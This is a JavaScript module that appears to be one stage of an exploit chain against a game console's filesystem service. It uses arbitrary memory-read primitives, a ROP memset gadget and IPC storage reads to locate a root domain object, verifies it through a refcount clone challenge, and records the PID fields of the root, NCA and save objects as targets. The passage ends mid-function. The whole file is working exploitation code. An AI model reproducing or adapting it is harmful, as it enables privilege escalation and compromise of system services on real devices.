import coreRuntime from "../runtime.mjs";
import {hasByteDifferentFast, readFsAddressBytes} from "./util.mjs";

const {
  AnalysisBytes,
  GADGET_MEMSET,
  RootLayout,
  allocPage,
  call_rop,
  cloneObject,
  closeHandle,
  hex32,
  ipcStorageRead,
  log,
  openDomainSession,
  read32,
  read64,
  read8
} = coreRuntime;

// ── Root identity inspection ──────────────────────────────────────────────

export async function inspectFspIdentityTargetsReadOnly(input) {
    const config = input.config;
    const optimizeRootCandidateScan = input.optimizeRootCandidateScan === true;
    const collectRootScanTiming = input.collectRootScanTiming === true;
    let addressPlan = input.addressPlan;
    let candidateHandle = input.candidateHandle;
    let domainSession = input.domainSession;
    let rootCandidateRetryable = input.rootCandidateRetryable;
    let rootPidRead = input.rootPidRead;
    let rootSession = input.rootSession;
    let verifiedIdentityTargets = input.verifiedIdentityTargets;
    const addressReadInput = {config, addressPlan, candidateHandle};
    let retainedCacheLayout = null;
    var retainedArrays = [];
    var retainedOwners = [];
    var retainedArraySeen = Object.create(null);
    var retainedOwnerSeen = Object.create(null);
    var retainedHeader0 = AnalysisBytes.readU64LE(addressPlan.bytes, 0);
    var retainedHeader1 = AnalysisBytes.readU64LE(addressPlan.bytes, 8);
    var rootTiming = {startedAt: collectRootScanTiming ? Date.now() : 0,
        clearMs: 0, readMs: 0,
        scanMs: 0, chunksRead: 0};

    function unusedCacheTail(bytes, start) {
        var tail = bytes.slice(start, start + 0x570);
        if (tail.length !== 0x570) return false;
        var any = false;
        for (var i = 0; i < tail.length; i++) any = any || !!tail[i];
        if (!any) return true;
        var pathStart;
        var exactEightBytePath = false;
        if (tail[0] === 0x41) pathStart = 0;
        else if (tail[0] === 0 && tail[1] === 0x41) pathStart = 1;
        else if (AnalysisBytes.toHex(tail, 0, 8) === "0000400100000000") {
            pathStart = 8;
            exactEightBytePath = true;
        } else if (AnalysisBytes.toHex(tail, 0, 5) === "0000400100")
            pathStart = tail[5] === 0 ? 6 : 5;
        else return false;
        var end = -1;
        for (var ti = pathStart; ti < tail.length; ti++) {
            if (tail[ti] === 0) { end = ti - pathStart; break; }
        }
        if (end <= 0 || (exactEightBytePath && end !== 552)) return false;
        var hasSlash = false;
        for (var pi = 0; pi < end; pi++) {
            var value = tail[pathStart + pi];
            if (value !== 0x41 && value !== 0x2F) return false;
            if (value === 0x2F) hasSlash = true;
        }
        if (!hasSlash) return false;
        for (var zi = pathStart + end; zi < tail.length; zi++)
            if (tail[zi] !== 0) return false;
        return true;
    }

    function rememberRetainedArray(address, bytes, offset) {
        if (offset < 0 || offset + 0x5A0 > bytes.length ||
            AnalysisBytes.readU64LE(bytes, offset) !== retainedHeader0 ||
            AnalysisBytes.readU64LE(bytes, offset + 8) !== retainedHeader1 ||
            bytes[offset + 0x10] !== 0 ||
            AnalysisBytes.readU64LE(bytes, offset + 0x18) !== 0n ||
            AnalysisBytes.readU64LE(bytes, offset + 0x20) !== 0n ||
            AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0n ||
            !unusedCacheTail(bytes, offset + 0x30)) return;
        var key = address.toString(16);
        if (retainedArraySeen[key]) return;
        retainedArraySeen[key] = true;
        retainedArrays.push({address, bytes: bytes.slice(offset, offset + 0x5A0)});
    }

    function rememberRetainedOwner(address, bytes, offset) {
        if (offset < 0 || offset + 0x78 > bytes.length ||
            AnalysisBytes.readU64LE(bytes, offset + 0x20) !==
                BigInt(addressPlan.storageSize) ||
            AnalysisBytes.readU64LE(bytes, offset + 0x28) !== 0x4000n ||
            AnalysisBytes.readU64LE(bytes, offset + 0x50) !== 0x5A0n ||
            AnalysisBytes.readU32LE(bytes, offset + 0x58) !== 10 ||
            AnalysisBytes.readU64LE(bytes, offset + 0x60) !== 14n) return;
        var array = AnalysisBytes.readU64LE(bytes, offset + 0x48);
        if (array < 0x100000000n || array >= 0x8000000000n ||
            array % 8n !== 0n) return;
        var key = address.toString(16);
        if (retainedOwnerSeen[key]) return;
        retainedOwnerSeen[key] = true;
        retainedOwners.push({address, array: Number(array),
            bytes: bytes.slice(offset, offset + 0x78)});
    }

    function copyNativeBytes(pointer, length) {
        var bytes = new Array(length);
        if (!optimizeRootCandidateScan) {
            for (var i = 0; i < length; i++)
                bytes[i] = Number(read8(pointer + BigInt(i)));
            return bytes;
        }
        var wordEnd = length - length % 8;
        for (var wordOffset = 0; wordOffset < wordEnd; wordOffset += 8) {
            var word = read64(pointer + BigInt(wordOffset));
            for (var byteIndex = 0; byteIndex < 8; byteIndex++) {
                bytes[wordOffset + byteIndex] = Number(word & 0xFFn);
                word >>= 8n;
            }
        }
        for (var tailOffset = wordEnd; tailOffset < length; tailOffset++)
            bytes[tailOffset] = Number(read8(pointer + BigInt(tailOffset)));
        return bytes;
    }

    function scanRetainedNativeChunk(buffer, chunkAddress, scanArrays) {
        var chunkLength = config.ROOT_CAPTURE_CHUNK;
        if (scanArrays) {
            for (var offset = 0; offset + 0x5A0 <= chunkLength; offset += 8) {
                if (read64(buffer + BigInt(offset)) !== retainedHeader0 ||
                    read64(buffer + BigInt(offset + 8)) !== retainedHeader1 ||
                    Number(read8(buffer + BigInt(offset + 0x10))) !== 0 ||
                    read64(buffer + BigInt(offset + 0x18)) !== 0n ||
                    read64(buffer + BigInt(offset + 0x20)) !== 0n ||
                    read64(buffer + BigInt(offset + 0x28)) !== 0n) continue;
                var tail = copyNativeBytes(buffer + BigInt(offset + 0x30), 0x570);
                // Reuse the exact reference tail-shape guard on a compact local view.
                var candidate = new Array(0x5A0);
                for (var ti = 0; ti < tail.length; ti++)
                    candidate[0x30 + ti] = tail[ti];
                if (!unusedCacheTail(candidate, 0x30)) continue;
                rememberRetainedArray(chunkAddress + offset, [
                    ...copyNativeBytes(buffer + BigInt(offset), 0x30), ...tail
                ], 0);
            }
        }
        for (var ownerOffset = 0; ownerOffset + 0x78 <= chunkLength;
            ownerOffset += 8) {
            if (read64(buffer + BigInt(ownerOffset + 0x20)) !==
                    BigInt(addressPlan.storageSize) ||
                read64(buffer + BigInt(ownerOffset + 0x28)) !== 0x4000n ||
                read64(buffer + BigInt(ownerOffset + 0x50)) !== 0x5A0n ||
                Number(read32(buffer + BigInt(ownerOffset + 0x58))) !== 10 ||
                read64(buffer + BigInt(ownerOffset + 0x60)) !== 14n) continue;
            var ownerBytes = copyNativeBytes(buffer + BigInt(ownerOffset), 0x78);
            rememberRetainedOwner(chunkAddress + ownerOffset,
                ownerBytes, 0);
        }
    }

    function scanRetainedBoundary(previousTail, previousStart, buffer,
        chunkAddress) {
        if (!previousTail || previousTail.length !== 0x5A0) return;
        var boundary = previousTail.concat(copyNativeBytes(buffer, 0x5A0));
        for (var offset = 0; offset < 0x5A0; offset += 8)
            rememberRetainedArray(previousStart + offset, boundary, offset);
        var ownerStart = 0x5A0 - 0x78;
        for (var ownerOffset = ownerStart; ownerOffset < 0x5A0;
            ownerOffset += 8)
            rememberRetainedOwner(previousStart + ownerOffset, boundary,
                ownerOffset);
    }

    const lookupResult = (ok) => ({ok,
        domainSession: ok ? domainSession : null,
        rootCandidateRetryable, rootPidRead,
        verifiedIdentityTargets: ok ? verifiedIdentityTargets : null,
        rootTiming: collectRootScanTiming ? {
            clearMs: rootTiming.clearMs,
            readMs: rootTiming.readMs,
            scanMs: rootTiming.scanMs,
            lookupMs: Math.max(0, Date.now() - rootTiming.startedAt -
                rootTiming.clearMs - rootTiming.readMs - rootTiming.scanMs),
            chunksRead: rootTiming.chunksRead
        } : null});
    rootCandidateRetryable = false;
    await log("ROOT: begin separate-domain table inspection");
    var opened = openDomainSession();
    if (!opened) {
        await log("ROOT: separate domain session open failed");
        return lookupResult(false);
    }
    domainSession = opened;
    var cloneHandles = [];
    var verified = false;

    try {
        var domainId = Number(opened.rootObj) >>> 0;
        if (domainId === 0 || domainId > 0x4000) {
            await log("ROOT: invalid root domain ID=" + domainId);
            return lookupResult(false);
        }
        await log("ROOT: domain session handle=" + opened.handle +
            " rootId=" + domainId + "; current fsp-srv handle=" + rootSession +
            " retained; rootId derived from opened.rootObj on the same " +
            "openDomainSession() result as this handle");

        var anchor = Number(addressPlan.target);
        var captureStart = anchor - config.ROOT_CAPTURE_BACK;
        var captureEnd = captureStart + config.ROOT_CAPTURE_SIZE;
        var lowerStart = Number(addressPlan.lowerWindow.proposedStart);
        var startOffset = captureStart - Number(addressPlan.addressBias);
        var periodRemainder = Number(addressPlan.readOffset) % config.ROOT_CAPTURE_CHUNK;

        if (!Number.isSafeInteger(anchor) || !Number.isSafeInteger(captureStart) ||
            captureStart < 0x100000000 || captureEnd !== anchor - config.ROOT_CAPTURE_GAP ||
            !addressPlan.lowerWindow || addressPlan.lowerWindow.prefix < config.ROOT_CAPTURE_BACK ||
            captureStart < lowerStart || captureEnd > anchor || startOffset < 0 ||
            startOffset % config.ROOT_CAPTURE_CHUNK !== periodRemainder ||
            Math.floor(startOffset / config.CONTROL_SIZE) * config.CONTROL_SIZE %
                config.ROOT_CAPTURE_CHUNK !== 0 ||
            startOffset + config.ROOT_CAPTURE_SIZE > addressPlan.storageSize ||
            config.ROOT_CAPTURE_CHUNKS !== 31) {
            await log("ROOT: bounded capture arithmetic rejected");
            return lookupResult(false);
        }

        await log("ROOT: bounded capture [0x" +
            captureStart.toString(16) + ",0x" + captureEnd.toString(16) +
            ") bytes=0x" + config.ROOT_CAPTURE_SIZE.toString(16) +
            " chunks=" + config.ROOT_CAPTURE_CHUNKS + " period=0x" +
            config.ROOT_CAPTURE_CHUNK.toString(16) + " anchor=0x" +
            anchor.toString(16));

        var captureBuf = allocPage(config.ROOT_CAPTURE_CHUNK + 0x2000);
        if (!captureBuf) {
            await log("ROOT: capture buffer allocation failed");
            return lookupResult(false);
        }
        var domainCandidates = [];
        var domainCandidateSeen = {};
        var carry = null;
        var retainedBoundaryTail = null;
        var retainedBoundaryAddress = 0;
        var captureChunksDone = 0;

        for (var chunkIndex = 0; chunkIndex < config.ROOT_CAPTURE_CHUNKS;
            chunkIndex++) {
            var chunkOffset = startOffset + chunkIndex * config.ROOT_CAPTURE_CHUNK;
            var chunkAddress = captureStart + chunkIndex * config.ROOT_CAPTURE_CHUNK;
            var bucketStart = Math.floor(chunkOffset / config.CONTROL_SIZE) *
                config.CONTROL_SIZE;
            if (bucketStart % config.ROOT_CAPTURE_CHUNK !== 0 ||
                chunkOffset % config.ROOT_CAPTURE_CHUNK !== periodRemainder ||
                chunkOffset + config.ROOT_CAPTURE_CHUNK > addressPlan.storageSize) {
                await log("ROOT: capture chunk bounds rejected index=" +
                    chunkIndex);
                return lookupResult(false);
            }

            var clearStartedAt = collectRootScanTiming ? Date.now() : 0;
            call_rop(GADGET_MEMSET, captureBuf, 0xA5n,
                BigInt(config.ROOT_CAPTURE_CHUNK));
            if (collectRootScanTiming)
                rootTiming.clearMs += Date.now() - clearStartedAt;
            var readStartedAt = collectRootScanTiming ? Date.now() : 0;
            var captureReply = ipcStorageRead(candidateHandle, chunkOffset,
                config.ROOT_CAPTURE_CHUNK, captureBuf);
            if (collectRootScanTiming)
                rootTiming.readMs += Date.now() - readStartedAt;
            if (captureReply.error !== 0) {
                await log("ROOT: capture read failed chunk=" +
                    chunkIndex + " rc=" + hex32(captureReply.error));
                return lookupResult(false);
            }
            if (collectRootScanTiming) rootTiming.chunksRead++;
            var scanStartedAt = collectRootScanTiming ? Date.now() : 0;
            if (!hasByteDifferentFast(captureBuf,
                    config.ROOT_CAPTURE_CHUNK, 0xA5)) {
                if (collectRootScanTiming)
                    rootTiming.scanMs += Date.now() - scanStartedAt;
                await log("ROOT: capture chunk remained poison index=" +
                    chunkIndex);
                return lookupResult(false);
            }

            scanRetainedBoundary(retainedBoundaryTail,
                retainedBoundaryAddress, captureBuf, chunkAddress);
            if (!optimizeRootCandidateScan)
                scanRetainedNativeChunk(captureBuf, chunkAddress, true);
            retainedBoundaryTail = copyNativeBytes(
                captureBuf + BigInt(config.ROOT_CAPTURE_CHUNK - 0x5A0),
                0x5A0);
            retainedBoundaryAddress = chunkAddress +
                config.ROOT_CAPTURE_CHUNK - 0x5A0;

            var scanInput = {buffer: captureBuf,
                chunkAddress, carry, candidates: domainCandidates,
                seen: domainCandidateSeen, config,
                scanRetainedArrays: optimizeRootCandidateScan,
                retainedOwnerSize: BigInt(addressPlan.storageSize),
                retainedHeader0, retainedHeader1,
                rememberRetainedArray, rememberRetainedOwner,
                copyNativeBytes};
            var scannedChunk = optimizeRootCandidateScan
                ? scanRootDomainChunkPrefiltered(scanInput)
                : scanRootDomainChunk(scanInput);
            domainCandidates = scannedChunk.candidates;
            domainCandidateSeen = scannedChunk.seen;
            carry = captureDomainTail({buffer: captureBuf, chunkAddress,
                config, copyNativeBytes});
            captureChunksDone++;
            if (collectRootScanTiming)
                rootTiming.scanMs += Date.now() - scanStartedAt;
            var progressChunk = Math.ceil(config.ROOT_CAPTURE_CHUNKS / 2);
            if (captureChunksDone === progressChunk &&
                typeof input.reportProgress === "function") {
                await input.reportProgress("FSP root capture and scan in progress: " +
                    captureChunksDone + "/" + config.ROOT_CAPTURE_CHUNKS +
                    " chunks; wrappers=" + domainCandidates.length +
                    "; cache arrays/owners=" + retainedArrays.length + "/" +
                    retainedOwners.length + ".");
            }
        }

        var retainedPairs = [];
        for (var retainedOwnerIndex = 0;
            retainedOwnerIndex < retainedOwners.length;
            retainedOwnerIndex++) {
            var retainedOwner = retainedOwners[retainedOwnerIndex];
            for (var retainedArrayIndex = 0;
                retainedArrayIndex < retainedArrays.length;
                retainedArrayIndex++) {
                var retainedArray = retainedArrays[retainedArrayIndex];
                if (retainedOwner.array === retainedArray.address)
                    retainedPairs.push({array: retainedArray.address,
                        owner: retainedOwner.address,
                        arrayBytes: retainedArray.bytes,
                        ownerBytes: retainedOwner.bytes});
            }
        }
        var retainedPairMap = Object.create(null);
        for (var retainedPairIndex = 0;
            retainedPairIndex < retainedPairs.length;
            retainedPairIndex++) {
            var retainedPair = retainedPairs[retainedPairIndex];
            retainedPairMap[retainedPair.array.toString(16) + ":" +
                retainedPair.owner.toString(16)] = retainedPair;
        }
        var retainedPairKeys = Object.keys(retainedPairMap);
        if (retainedPairKeys.length === 1)
            retainedCacheLayout = {...retainedPairMap[retainedPairKeys[0]],
                captureStart, captureEnd};
        await log("ROOT: retained cache scan arrays=" +
            retainedArrays.length + " owners=" + retainedOwners.length +
            " exactPairs=" + retainedPairKeys.length +
            (retainedCacheLayout ? " array=0x" +
                retainedCacheLayout.array.toString(16) + " owner=0x" +
                retainedCacheLayout.owner.toString(16) : ""));

        var groups = RootLayout.groupDomainCandidates(domainCandidates);
        await log("ROOT: capture complete bytes=0x" +
            config.ROOT_CAPTURE_SIZE.toString(16) + " wrappers=" +
            domainCandidates.length + " vtable-manager groups=" + groups.length);

        var tableMatches = [];
        for (var gi = 0; gi < groups.length; gi++) {
            var group = groups[gi];
            var groupDomainSample = group.domains.slice(0, 8).map(
                function(item) { return "0x" + item.address.toString(16); }
            ).join(",");
            await log("ROOT TABLE: group=" + gi +
                " domains=" + group.domains.length +
                " domainSamples=" + (groupDomainSample || "none") +
                " rootVptr=0x" + group.rootVptr.toString(16) +
                " manager=0x" + group.manager.toString(16));
            if (!RootLayout.rangeContains(captureStart, config.ROOT_CAPTURE_SIZE,
                    group.manager, 0x20)) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=manager-bounds manager=0x" +
                    group.manager.toString(16) + " size=0x20 capture=[0x" +
                    captureStart.toString(16) + ",0x" +
                    captureEnd.toString(16) + ")");
                continue;
            }

            await log("ROOT TABLE: group=" + gi +
                " manager-read address=0x" + group.manager.toString(16) +
                " size=0x20");
            var managerRead = await readFsAddressBytes({...addressReadInput,
                address: group.manager, length: 0x20, outputBuf: captureBuf});
            if (!managerRead.ok) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=manager-read fatal=" + !!managerRead.fatal +
                    " error=" + managerRead.error);
                if (managerRead.fatal) {
                    await log("ROOT: manager read failed: " +
                        managerRead.error);
                    return lookupResult(false);
                }
                continue;
            }
            var managerCount = AnalysisBytes.readU32LE(managerRead.bytes, 0x10);
            var tablePointer = AnalysisBytes.readU64LE(managerRead.bytes, 0x18);
            var managerCapacityOk = managerCount === 0x4000;
            var tablePointerCanonical = RootLayout.isCanonicalPointer(tablePointer);
            await log("ROOT TABLE: group=" + gi +
                " manager-count=0x" + managerCount.toString(16) +
                " expected=0x4000 ok=" + managerCapacityOk +
                " table-pointer=0x" + tablePointer.toString(16) +
                " canonical=" + tablePointerCanonical);
            if (!managerCapacityOk || !tablePointerCanonical) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=manager-capacity-or-table-pointer capacityOk=" +
                    managerCapacityOk + " pointerCanonical=" +
                    tablePointerCanonical);
                continue;
            }
            var table = Number(tablePointer);
            var tableInCapture = RootLayout.rangeContains(captureStart,
                config.ROOT_CAPTURE_SIZE, table, 0x4000);
            await log("ROOT TABLE: group=" + gi +
                " table-bounds pointer=0x" + table.toString(16) +
                " size=0x4000 inCapture=" + tableInCapture +
                " capture=[0x" + captureStart.toString(16) + ",0x" +
                captureEnd.toString(16) + ")");
            if (!tableInCapture) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=table-bounds");
                continue;
            }

            var entryIndex = domainId - 1;
            var entryAddress = table + entryIndex * 0x30;
            var entryInCapture = RootLayout.rangeContains(captureStart,
                config.ROOT_CAPTURE_SIZE, entryAddress, 0x30);
            var entryInTable = entryAddress >= table &&
                entryAddress + 0x30 <= table + managerCount * 0x30;
            await log("ROOT TABLE: group=" + gi +
                " rootId=" + domainId + " index=" + entryIndex +
                " entry=0x" + entryAddress.toString(16) +
                " size=0x30 inCapture=" + entryInCapture +
                " inTable=" + entryInTable + " tableEnd=0x" +
                (table + managerCount * 0x30).toString(16));
            if (!entryInCapture || !entryInTable) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=index-entry-bounds");
                continue;
            }

            await log("ROOT TABLE: group=" + gi +
                " entry-read address=0x" + entryAddress.toString(16) +
                " size=0x30");
            var entryRead = await readFsAddressBytes({...addressReadInput,
                address: entryAddress, length: 0x30, outputBuf: captureBuf});
            if (!entryRead.ok) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=entry-read fatal=" + !!entryRead.fatal +
                    " error=" + entryRead.error);
                if (entryRead.fatal) {
                    await log("ROOT: domain-entry read failed: " +
                        entryRead.error);
                    return lookupResult(false);
                }
                continue;
            }
            var entryDomain = AnalysisBytes.readU64LE(entryRead.bytes, 0x18);
            var objectAddress = AnalysisBytes.readU64LE(entryRead.bytes, 0x20);
            var entryVptr = AnalysisBytes.readU64LE(entryRead.bytes, 0x28);
            var entryVptrDelta = entryVptr - BigInt(group.rootVptr);
            var entryVptrDeltaText = entryVptrDelta < 0n
                ? "-0x" + (-entryVptrDelta).toString(16)
                : "+0x" + entryVptrDelta.toString(16);
            await log("ROOT TABLE: group=" + gi +
                " entry-values domain=0x" + entryDomain.toString(16) +
                " object=0x" + objectAddress.toString(16) +
                " classVptr=0x" + entryVptr.toString(16) +
                " classVptrOffset=" + entryVptrDeltaText);
            var domainCandidate = null;
            for (var di = 0; di < group.domains.length; di++) {
                if (BigInt(group.domains[di].address) === entryDomain) {
                    domainCandidate = group.domains[di];
                    break;
                }
            }
            var domainAddressMatched = !!domainCandidate;
            var objectPointerCanonical = RootLayout.isCanonicalPointer(objectAddress);
            if (domainCandidate) {
                await log("ROOT TABLE: matched-wrapper address=0x" +
                    domainCandidate.address.toString(16) +
                    " entryDomain=0x" + entryDomain.toString(16) +
                    " word+0x00=0x" + domainCandidate.first.toString(16) +
                    " word+0x08=0x" + domainCandidate.second.toString(16) +
                    " word+0x18=0x" + domainCandidate.manager.toString(16));
            }
            await log("ROOT TABLE: group=" + gi +
                " entry-match domainInGroup=" + domainAddressMatched +
                (domainCandidate ? " domainAddress=0x" +
                    domainCandidate.address.toString(16) : "") +
                " objectCanonical=" + objectPointerCanonical +
                " classVptrOffset=" + entryVptrDeltaText +
                " classVptrIsDiagnosticOnly=true");
            if (!domainAddressMatched || !objectPointerCanonical) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=owned-root-entry-owner-or-object-pointer");
                continue;
            }

            await log("ROOT TABLE: group=" + gi +
                " domain-wrapper-read address=0x" +
                domainCandidate.address.toString(16) + " size=0x20");
            var wrapperRead = await readFsAddressBytes({...addressReadInput,
                address: domainCandidate.address, length: 0x20,
                outputBuf: captureBuf});
            if (!wrapperRead.ok) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=domain-wrapper-read fatal=" + !!wrapperRead.fatal +
                    " error=" + wrapperRead.error);
                if (wrapperRead.fatal) {
                    await log("ROOT: domain-wrapper read failed: " +
                        wrapperRead.error);
                    return lookupResult(false);
                }
                continue;
            }
            var wrapperVptr0 = AnalysisBytes.readU64LE(wrapperRead.bytes, 0);
            var wrapperVptr1 = AnalysisBytes.readU64LE(wrapperRead.bytes, 8);
            var wrapperManager = AnalysisBytes.readU64LE(wrapperRead.bytes, 0x18);
            var expectedWrapperVptr0 = BigInt(group.rootVptr + 0x28e0);
            var expectedWrapperVptr1 = BigInt(group.rootVptr + 0x2938);
            var wrapperVptr0Matched = wrapperVptr0 === expectedWrapperVptr0;
            var wrapperVptr1Matched = wrapperVptr1 === expectedWrapperVptr1;
            var wrapperManagerMatched = wrapperManager === BigInt(group.manager);
            await log("ROOT TABLE: group=" + gi +
                " wrapper-layout vptr0=0x" + wrapperVptr0.toString(16) +
                " expected0=0x" + expectedWrapperVptr0.toString(16) +
                " match0=" + wrapperVptr0Matched +
                " vptr1=0x" + wrapperVptr1.toString(16) +
                " expected1=0x" + expectedWrapperVptr1.toString(16) +
                " match1=" + wrapperVptr1Matched +
                " manager=0x" + wrapperManager.toString(16) +
                " expectedManager=0x" + group.manager.toString(16) +
                " managerMatch=" + wrapperManagerMatched);
            if (!wrapperVptr0Matched || !wrapperVptr1Matched ||
                !wrapperManagerMatched) {
                await log("ROOT TABLE: reject group=" + gi +
                    " stage=wrapper-vtables-manager");
                continue;
            }

            tableMatches.push({domainId: domainId, entry: entryAddress,
                domain: domainCandidate.address, object: Number(objectAddress),
                manager: group.manager, table: table,
                rootVptr: group.rootVptr, entryBytes: entryRead.bytes});
            await log("ROOT TABLE: group=" + gi +
                " produced coherent entry=0x" + entryAddress.toString(16));
        }

        await log("ROOT TABLE: lookup summary rootId=" +
            domainId + " groups=" + groups.length + " matches=" +
            tableMatches.length);
        if (tableMatches.length !== 1) {
            await log("ROOT: domain table lookup=" +
                (tableMatches.length === 0 ? "no match" : "ambiguous") +
                " matches=" + tableMatches.length);
            // The address read itself was valid, but this capture did not
            // identify one table entry for the session's domain ID. A later
            // bounded candidate capture may cover the correct heap region.
            rootCandidateRetryable = true;
            return lookupResult(false);
        }

        var located = tableMatches[0];
        await log("ROOT: entry id=" + located.domainId +
            " at=0x" + located.entry.toString(16) +
            " domain=0x" + located.domain.toString(16) +
            " object=0x" + located.object.toString(16) +
            " manager=0x" + located.manager.toString(16) +
            " table=0x" + located.table.toString(16) +
            " classVptr=0x" +
            AnalysisBytes.readU64LE(located.entryBytes, 0x28).toString(16));

        var rootRead = await readFsAddressBytes({...addressReadInput,
            address: located.object, length: 0x40, outputBuf: captureBuf});
        if (!rootRead.ok) {
            await log("ROOT: object read failed: " + rootRead.error);
            if (!rootRead.fatal) rootCandidateRetryable = true;
            return lookupResult(false);
        }
        var rootBytes = rootRead.bytes;
        var rootObjectVptr = AnalysisBytes.readU64LE(rootBytes, 0);
        var rootRefCount = AnalysisBytes.readU32LE(rootBytes, 0x38);
        if (rootObjectVptr !== BigInt(located.rootVptr) ||
            rootRefCount === 0 || rootRefCount >= 0x1000000) {
            await log("ROOT: object layout rejected vptr=0x" +
                rootObjectVptr.toString(16) + " ref=0x" +
                rootRefCount.toString(16));
            rootCandidateRetryable = true;
            return lookupResult(false);
        }
        await log("ROOT: object vptr=0x" +
            rootObjectVptr.toString(16) + " ref=0x" +
            rootRefCount.toString(16));

        var liveBaseline = rootBytes.slice();
        var expectedCount = rootRefCount + 3;
        var cloneOpened = true;
        var challengeOnlyCounter = false;
        var challengeRestored = false;
        var cloneCloseOk = true;
        if (expectedCount > 0xFFFFFFFF) cloneOpened = false;

        try {
            if (cloneOpened) {
                for (var cloneIndex = 0; cloneIndex < 3; cloneIndex++) {
                    var cloneHandle = cloneObject(opened.handle, domainId);
                    if (!cloneHandle) {
                        cloneOpened = false;
                        await log("ROOT: clone open failed index=" +
                            cloneIndex);
                        break;
                    }
                    cloneHandles.push(cloneHandle);
                }
            }

            if (cloneOpened && cloneHandles.length === 3) {
                var duringRead = await readFsAddressBytes({...addressReadInput,
                    address: located.object, length: 0x40,
                    outputBuf: captureBuf});
                if (duringRead.ok) {
                    var expectedDuring = liveBaseline.slice();
                    AnalysisBytes.writeU32LE(expectedDuring, 0x38, expectedCount);
                    challengeOnlyCounter = AnalysisBytes.equal(duringRead.bytes,
                        expectedDuring);
                    await log("ROOT: clone challenge before=0x" +
                        rootRefCount.toString(16) + " during=0x" +
                        AnalysisBytes.readU32LE(duringRead.bytes, 0x38).toString(16) +
                        " expected=0x" + expectedCount.toString(16) +
                        " onlyRefcount=" + challengeOnlyCounter);
                } else {
                    await log("ROOT: clone challenge read failed: " +
                        duringRead.error);
                }
            }
        } finally {
            var challengedClones = cloneHandles.length;
            var failedCloneCloses = [];
            var stillOpenClones = [];
            for (var closeIndex = cloneHandles.length - 1;
                closeIndex >= 0; closeIndex--) {
                var challengedHandle = cloneHandles[closeIndex];
                var closeResult = Number(closeHandle(
                    challengedHandle)) >>> 0;
                if (closeResult !== 0) {
                    cloneCloseOk = false;
                    failedCloneCloses.push(hex32(closeResult));
                    stillOpenClones.push(challengedHandle);
                }
            }
            cloneHandles = stillOpenClones;
            await log("ROOT: challenge clones closed=" +
                challengedClones + " errors=" +
                (failedCloneCloses.join(",") || "none"));
        }

        var restoredRead = await readFsAddressBytes({...addressReadInput,
            address: located.object, length: 0x40, outputBuf: captureBuf});
        if (restoredRead.ok)
            challengeRestored = AnalysisBytes.equal(restoredRead.bytes,
                liveBaseline);
        await log("ROOT: clone restore=" + challengeRestored +
            " closeOk=" + cloneCloseOk + " exactBytes=" +
            (restoredRead.ok && challengeRestored));

        if (!challengeRestored || !cloneCloseOk) {
            await log("ROOT: clone proof did not restore cleanly; " +
                "PID and backend reads skipped");
            return lookupResult(false);
        }
        if (!challengeOnlyCounter) {
            await log("ROOT: clone proof changed unexpected bytes; " +
                "PID and backend reads skipped");
            rootCandidateRetryable = true;
            return lookupResult(false);
        }

        var rootPid = AnalysisBytes.readU64LE(liveBaseline, 0x30);
        rootPidRead = true;
        var rootPidPlausible = rootPid > 1n && rootPid < 0x1000000n;
        await log("ROOT: clone proof passed; PID=0x" +
            rootPid.toString(16) + " plausible=" + rootPidPlausible);
        if (!rootPidPlausible) {
            await log("ROOT: implausible PID; backend links and " +
                "PID fields skipped");
            return lookupResult(false);
        }

        var backendChecksOk = true;
        var backendResults = [];
        var ncaRaw = AnalysisBytes.readU64LE(rootBytes, 0x10);
        var ncaControl = AnalysisBytes.readU64LE(rootBytes, 0x18);
        var saveRaw = AnalysisBytes.readU64LE(rootBytes, 0x20);
        var saveControl = AnalysisBytes.readU64LE(rootBytes, 0x28);
        backendResults.push(await inspectRootBackend("nca", ncaRaw,
            ncaControl, 0x20, rootPid, captureBuf, addressReadInput));
        backendResults.push(await inspectRootBackend("save", saveRaw,
            saveControl, 0x28, rootPid, captureBuf, addressReadInput));
        for (var backendIndex = 0; backendIndex < backendResults.length;
            backendIndex++) {
            var backendResult = backendResults[backendIndex];
            if (!backendResult.read || !backendResult.linksOk ||
                !backendResult.vptrShapeOk || !backendResult.pidOk ||
                !backendResult.stable) backendChecksOk = false;
        }

        var rootFinalRead = await readFsAddressBytes({...addressReadInput,
            address: located.object, length: 0x40, outputBuf: captureBuf});
        var rootStable = rootFinalRead.ok &&
            AnalysisBytes.equal(rootFinalRead.bytes, liveBaseline);
        await log("ROOT: final identity reread ok=" +
            rootFinalRead.ok + " byteStable=" + rootStable +
            " pidUnchanged=" + (rootStable &&
                AnalysisBytes.readU64LE(rootFinalRead.bytes, 0x30) === rootPid));

        verified = rootPidPlausible && challengeOnlyCounter &&
            challengeRestored && cloneCloseOk && rootStable &&
            backendResults.length === 2 && backendChecksOk;
        if (verified) {
            verifiedIdentityTargets = {
                domainId: domainId,
                retainedCache: retainedCacheLayout,
                domainLayout: {
                    domainId: located.domainId,
                    entry: located.entry,
                    domain: located.domain,
                    object: located.object,
                    manager: located.manager,
                    table: located.table,
                    rootVptr: located.rootVptr,
                    entryBytes: Array.from(located.entryBytes),
                    captureStart: captureStart,
                    captureEnd: captureEnd
                },
                fields: [
                    {name: "root", object: Number(located.object),
                        objectSize: 0x40, pidOffset: 0x30,
                        before: rootPid, beforeBytes: liveBaseline.slice()},
                    {name: "nca", object: backendResults[0].address,
                        objectSize: 0x60, pidOffset: 0x20,
                        before: backendResults[0].pid,
                        beforeBytes: backendResults[0].bytes.slice()},
                    {name: "save", object: backendResults[1].address,
                        objectSize: 0x60, pidOffset: 0x28,
                        before: backendResults[1].pid,
                        beforeBytes: backendResults[1].bytes.slice()}
                ]
            };
        }
        await log("ROOT: result=" + (verified ? "VERIFIED" :
            "NOT VERIFIED") + " pid=0x" + rootPid.toString(16) +
            " domainId=" + domainId + " backends=" +
            backendResults.map(function(item) {
                return item.name + ":" +
                    (item.pid !== undefined ? "pid=0x" +
                        item.pid.toString(16) : "pid=unread") +
                    "/objectRead=" + !!item.read + "/links=" +
                    !!item.linksOk +
                    "/vptrShape=" + !!item.vptrShapeOk + "/stable=" +
                    !!item.stable;
            }).join(","));
